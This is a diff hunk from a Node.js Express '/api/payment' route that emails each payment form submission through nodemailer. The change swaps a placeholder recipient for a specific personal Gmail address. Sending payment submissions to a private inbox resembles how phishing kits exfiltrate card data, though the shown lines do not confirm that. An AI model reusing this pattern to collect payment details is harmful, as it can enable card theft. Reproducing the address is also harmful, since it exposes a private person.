@@ -39,7 +39,7 @@ app.post("/api/payment", async (req, res) => {
     // ✅ Send email
     await transporter.sendMail({
       from: `"Payment Bot" <${process.env.EMAIL_USER}>`,
-      to: "your-inbox@gmail.com", // replace with your receiving email
+      to: "clintonrecher37@gmail.com", // replace with your receiving email
       subject: "💳 New Payment Form Submission",
       text: `
       📩 New Payment Submission Received:
